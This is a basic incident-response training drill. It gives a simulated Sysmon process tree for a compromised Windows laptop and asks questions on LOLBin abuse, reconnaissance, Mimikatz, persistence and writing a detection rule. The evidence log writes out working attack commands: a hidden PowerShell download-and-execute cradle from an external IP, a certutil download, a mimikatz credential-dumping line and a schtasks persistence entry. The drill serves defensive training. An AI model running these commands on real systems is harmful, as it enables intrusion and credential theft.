# Drill 02 (Basic): Process Tree Analysis for Suspicious Activity

**Level:** Basic

**Estimated time:** 25 minutes

**Skills tested:** Process parent-child relationships, suspicious process identification, LOLBin detection

---

## Scenario

Your SIEM triggered an alert: **"PowerShell network connection to external IP"** on `LAPTOP-DEV03.corp.local` at 10:42 AM.
You pull up the process tree from your EDR for the past 30 minutes.

Below are the process creation events captured by Sysmon (Event ID 1) for this host.
Each entry shows: **[TIME] PID(PPID) User: Image — CommandLine**

Analyze the process trees and answer the questions.

---

## Evidence: Process Tree Data

```text
=== PROCESS TREE (LAPTOP-DEV03.corp.local) ===
=== Timeframe: 10:30 - 11:00 UTC ===

[10:30:02] PID:1000(4) SYSTEM: C:\Windows\System32\services.exe — services.exe
[10:30:05] PID:1200(1000) SYSTEM: C:\Windows\System32\svchost.exe — svchost.exe -k netsvcs -p -s Schedule
[10:30:10] PID:1800(716) CORP\msmith: C:\Windows\explorer.exe — explorer.exe
[10:35:15] PID:2100(1800) CORP\msmith: C:\Program Files\Microsoft VS Code\Code.exe — "Code.exe"
[10:36:22] PID:2200(2100) CORP\msmith: C:\Windows\System32\cmd.exe — cmd.exe
[10:36:25] PID:2201(2200) CORP\msmith: C:\Windows\System32\git.exe — git status

--- BRANCH A ---
[10:40:01] PID:3000(1200) SYSTEM: C:\Windows\System32\svchost.exe — svchost.exe -k DcomLaunch
[10:40:05] PID:3100(3000) CORP\msmith: C:\Windows\System32\mmc.exe — mmc.exe C:\Windows\system32\taskschd.msc /s

--- BRANCH B ---
[10:41:00] PID:4000(2100) CORP\msmith: C:\Program Files\Microsoft VS Code\Code.exe — "Code.exe" --type=extensionHost
[10:41:05] PID:4001(4000) CORP\msmith: C:\Windows\System32\cmd.exe — cmd.exe /c node ./build_script.js
[10:41:08] PID:4002(4001) CORP\msmith: C:\Program Files\nodejs\node.exe — node ./build_script.js

--- BRANCH C (SUSPICIOUS) ---
[10:41:30] PID:5000(1200) SYSTEM: C:\Windows\System32\svchost.exe — svchost.exe -k netsvcs -p -s wuauserv
[10:41:45] PID:5100(5000) CORP\msmith: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe — powershell.exe -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://185.234.219.47/run.ps1')"
[10:41:48] PID:5101(5100) CORP\msmith: C:\Windows\System32\cmd.exe — cmd.exe /c whoami /all
[10:41:49] PID:5102(5100) CORP\msmith: C:\Windows\System32\net.exe — net user /domain
[10:41:52] PID:5103(5100) CORP\msmith: C:\Windows\System32\net.exe — net group "Domain Admins" /domain
[10:41:55] PID:5104(5100) CORP\msmith: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe — powershell.exe -c "Get-ADComputer -Filter * | Select-Object Name,DNSHostName"
[10:42:10] PID:5105(5100) CORP\msmith: C:\Windows\System32\certutil.exe — certutil.exe -urlcache -split -f http://185.234.219.47/tools.zip C:\Users\msmith\AppData\Local\Temp\tools.zip

--- BRANCH D ---
[10:45:00] PID:6000(5100) CORP\msmith: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe — powershell.exe -c "Expand-Archive C:\Users\msmith\AppData\Local\Temp\tools.zip -DestinationPath C:\Users\msmith\AppData\Local\Temp\tools\"
[10:45:15] PID:6001(5100) CORP\msmith: C:\Users\msmith\AppData\Local\Temp\tools\mimikatz.exe — mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
[10:46:01] PID:6002(5100) CORP\msmith: C:\Windows\System32\schtasks.exe — schtasks /create /tn "OneDriveUpdate" /tr "C:\Users\msmith\AppData\Roaming\OneDriveUpdate.exe" /sc onlogon /ru CORP\msmith

--- NETWORK EVENTS ---
[10:41:45] PID:5100 → 185.234.219.47:80 TCP (PowerShell downloads run.ps1, 2.1KB)
[10:42:10] PID:5100 → 185.234.219.47:80 TCP (certutil downloads tools.zip, 4.7MB)
[10:46:30] PID:5100 → 185.234.219.47:443 TCP (POST request, 89KB sent) ← EXFILTRATION
```

---

## Questions

---

### Q1 — Identify Legitimate vs. Suspicious Activity (3 points)

Looking at all four branches (A, B, C, D):

a) Which branches represent **legitimate activity**?
Briefly justify.
b) Which branches represent **malicious activity**?
Briefly justify.
c) What is the boundary event — the single event where the attack begins?

---

### Q2 — Parent Process Analysis (3 points)

Focus on PID 5100 (the malicious PowerShell process, Branch C).

a) What is the parent process of PID 5100?
Is this normal?
b) What is unusual about a `svchost.exe` process (PID 5000, the parent) spawning a user-context PowerShell?
c) This pattern is a known attack technique.
What is it called?

---

### Q3 — LOLBin Identification (2 points)

Identify any **LOLBin (Living Off the Land Binary)** abuse in the process tree.

a) Name the binary/binaries being abused
b) What legitimate purpose do they serve?
c) How are they being abused here?

---

### Q4 — Reconnaissance Commands (2 points)

Analyze PIDs 5101–5104.

a) What information is the attacker gathering?
b) Why would an attacker want the output of `net group "Domain Admins" /domain`?

---

### Q5 — Tool Download and Execution (2 points)

Analyze PID 6001: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`

a) What is Mimikatz and what does this command do specifically?
b) What MITRE ATT&CK technique is this?

---

### Q6 — Persistence Mechanism (2 points)

Analyze PID 6002 (schtasks command).

a) What persistence was established?
b) When will `OneDriveUpdate.exe` execute?

---

### Q7 — Network Traffic Analysis (2 points)

Three network connections are logged.
What is happening in each:

* 10:41:45: PID 5100 → 185.234.219.47:80 (2.1KB download)
* 10:42:10: PID 5100 → 185.234.219.47:80 (4.7MB download)
* 10:46:30: PID 5100 → 185.234.219.47:443 (89KB sent)

What does the 10:46:30 connection represent?

---

### Q8 — Write a Detection Rule (4 points)

Write a plain-language detection rule that would have caught the initial compromise point (the entry into Branch C) **before any damage was done**.
Use this format:

```text
RULE NAME: [descriptive name]
TRIGGER: [what event(s) trigger this rule]
CONDITION: [what makes this match]
ALERT LEVEL: [Critical/High/Medium/Low]
JUSTIFICATION: [why this is reliable with few false positives]
```

---

## Submission

Bring your written answers to the lab review session.
See `solutions/drill-02-solution/README.md` for the complete answer key.
